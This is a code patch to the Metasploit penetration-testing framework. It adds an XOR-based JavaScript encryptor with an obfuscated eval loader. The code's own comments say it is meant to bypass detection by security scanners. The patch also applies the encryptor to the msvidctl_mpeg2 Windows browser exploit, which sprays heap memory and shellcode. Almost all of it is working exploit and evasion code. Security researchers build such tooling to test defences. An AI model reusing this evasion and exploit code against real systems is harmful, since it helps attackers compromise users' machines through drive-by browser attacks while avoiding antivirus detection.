@@ -1,0 +1,164 @@
+Index: lib/msf/core/exploit/http.rb
+===================================================================
+--- lib/msf/core/exploit/http.rb	(revision 6780)
++++ lib/msf/core/exploit/http.rb	(working copy)
+@@ -1,5 +1,6 @@
+ require 'rex/service_manager'
+ require 'rex/exploitation/obfuscatejs'
++require 'rex/exploitation/encryptjs'
+ require 'rex/exploitation/heaplib'
+ 
+ module Msf
+@@ -562,6 +563,15 @@
+ 		return js
+ 	end
+ 
++    #
++    # Encrypts a given javascript string using the provided key.
++    #
++    # Returns a string containing the encrypted string and a loader
++    #
++    def encrypt_js(javascript, key)
++      js_encoded = Rex::Exploitation::EncryptJS.encrypt(javascript, key)
++    end
++
+ 	#
+ 	# Returns the heaplib javascript, including any custom javascript supplied
+ 	# by the caller.
+Index: lib/rex/exploitation/encryptjs.rb
+===================================================================
+--- lib/rex/exploitation/encryptjs.rb	(revision 0)
++++ lib/rex/exploitation/encryptjs.rb	(revision 0)
+@@ -0,0 +1,77 @@
++module Rex
++module Exploitation
++
++#
++# Encrypts javascript code
++#
++class EncryptJS
++	#
++	# Encrypts a javascript string.
++	#
++	# Encrypts a javascript string via XOR using a given key.
++	# The key must be passed to the executed javascript
++	# so that it can decrypt itself.
++	# The provided loader gets the key from
++	# "location.search.substring(1)"
++	#
++	# This should bypass any detection of the file itself
++	# as information not part of the file is needed to
++	# decrypt the original javascript code.
++	#
++	# Example:
++	# <code>
++	# js = <<ENDJS
++	#     function say_hi() {
++	#         var foo = "Hello, world";
++	#         document.writeln(foo);
++	#     }
++	# ENDJS
++	# key = 'secret'
++	# js_encrypted = EncryptJS.encrypt(js, key)
++	# </code>
++	#
++	# You might use something like this in exploit
++	# modules to pass the key to the javascript
++	# <code>
++	# if (!request.uri.match(/\?\w+/))
++	#	  send_local_redirect(cli, "?#{@key}")
++	#	  return
++	# end
++	# </code>
++	#
++
++	def self.encrypt(js, key)
++		js.gsub!(/[\r\n]/, '')
++
++		encoded = Rex::Encoding::Xor::Generic.encode(js, key)[0].unpack("H*")[0]
++
++		# obfuscate the eval call to circumvent generic detection
++		eval = 'eval'.split(//).join(Rex::Text.rand_text_alpha(rand(5)).upcase)
++		eval_call = 'window["' + eval + '".replace(/[A-Z]/g,"")]'
++
++		js_loader = Rex::Exploitation::ObfuscateJS.new <<-ENDJS
++		var exploit = '#{encoded}';
++		var encoded = '';
++		for (i = 0;i<exploit.length;i+=2) {
++			encoded += String.fromCharCode(parseInt(exploit.substring(i, i+2), 16));
++		}
++		var pass = location.search.substring(1);
++		var decoded = '';
++		for (i=0;i<encoded.length;i++) {
++		decoded += String.fromCharCode(encoded.charCodeAt(i) ^ pass.charCodeAt(i%pass.length));
++		}
++		#{eval_call}(decoded);
++		ENDJS
++
++		js_loader.obfuscate(
++			'Symbols' => {
++				'Variables' => [ 'exploit', 'encoded', 'pass', 'decoded' ],
++			},
++			'Strings' => false
++		)
++	end
++
++end
++
++end
++end
+Index: modules/exploits/windows/browser/msvidctl_mpeg2.rb
+===================================================================
+--- modules/exploits/windows/browser/msvidctl_mpeg2.rb	(revision 6780)
++++ modules/exploits/windows/browser/msvidctl_mpeg2.rb	(working copy)
+@@ -64,6 +64,8 @@
+ 			[
+ 				OptString.new('ClassID', [ false, "Specific ClassID to use (otherwise randomized)", nil ]),
+ 			], self.class)
++
++		@javascript_encode_key = rand_text_alpha(rand(10) + 10)
+ 	end
+ 
+ 	def on_request_uri(cli, request)
+@@ -86,6 +88,11 @@
+ 			return
+ 		end
+ 
++		if (!request.uri.match(/\?\w+/))
++			send_local_redirect(cli, "?#{@javascript_encode_key}")
++			return
++		end
++        
+ 		print_status("Sending HTML to #{cli.peerhost}:#{cli.peerport}...")
+ 
+ 		# Re-generate the payload
+@@ -175,11 +182,7 @@
+ 		j_memory     = rand_text_alpha(rand(100) + 1)
+ 		j_counter    = rand_text_alpha(rand(30) + 2)
+ 
+-		html = %Q|<html> 
+-<body>  
+-<div id="#{div}"> 
+-<script>
+-#{j_shellcode}=unescape('#{shellcode}');
++		js = %Q|#{j_shellcode}=unescape('#{shellcode}');
+ #{j_nops}=unescape('#{nops}');
+ #{j_headersize}=20;
+ #{j_slackspace}=#{j_headersize}+#{j_shellcode}.length;
+@@ -195,7 +198,15 @@
+ #{msvidctl}.width='1';
+ #{msvidctl}.height='1';
+ #{msvidctl}.data='#{get_resource + "/" + Time.now.to_i.to_s + ".gif"}';
+-#{msvidctl}.classid='clsid:#{classid}';
++#{msvidctl}.classid='clsid:#{classid}';|
++
++		js_encoded = encrypt_js(js, @javascript_encode_key)
++
++		html = %Q|<html>
++<body>  
++<div id="#{div}"> 
++<script>
++#{js_encoded}
+ </script> 
+ </body> 
+ </html>|
